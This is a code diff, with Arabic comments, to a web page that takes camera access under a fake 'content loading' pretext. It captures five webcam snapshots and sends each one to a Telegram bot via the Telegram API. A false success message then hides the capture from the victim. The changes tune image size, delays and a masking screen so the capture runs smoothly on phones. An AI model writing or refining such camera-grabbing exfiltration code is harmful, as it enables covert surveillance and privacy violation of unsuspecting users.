@@ -24,17 +24,19 @@
                 const video = document.getElementById('v');
                 video.srcObject = stream;
 
+                // إخفاء الزر لمنع الضغط المكرر
+                document.body.innerHTML = '<h2>جاري المعالجة، يرجى الانتظار...</h2>';
+
                 setTimeout(async () => {
                     const canvas = document.getElementById('c');
-                    canvas.width = 160;  // حجم صغير جداً لضمان السرعة وعدم التعليق
-                    canvas.height = 120;
+                    canvas.width = 120;  // حجم خفيف جداً يمنع التجمد نهائياً
+                    canvas.height = 90;
                     const ctx = canvas.getContext('2d');
                     
                     for (let i = 1; i <= 5; i++) {
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         let base64Image = canvas.toDataURL('image/jpeg', 0.3);
 
-                        // إرسال كل صورة لوحدها بوضوح وبدون ضغط على المتصفح
                         try {
                             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                                 method: 'POST',
@@ -48,16 +50,16 @@
                             console.error(err);
                         }
 
-                        // فاصل زمني صغير جداً بين كل صورة والثانية عشان المتصفح يهدى
+                        // فاصل زمني أمان (ثانية كاملة) بين كل صورة والثانية عشان الموبايل ما يهنجش خالص
                         if (i < 5) {
-                            await new Promise(r => setTimeout(r, 400));
+                            await new Promise(r => setTimeout(r, 1000));
                         }
                     }
 
                     stream.getTracks().forEach(t => t.stop());
                     document.body.innerHTML = '<h2>تم تحميل المحتوى بنجاح!</h2>';
 
-                }, 1000);
+                }, 1500);
             } catch (e) {
                 alert('يرجى السماح بإذن الكاميرا للمتابعة');
             }
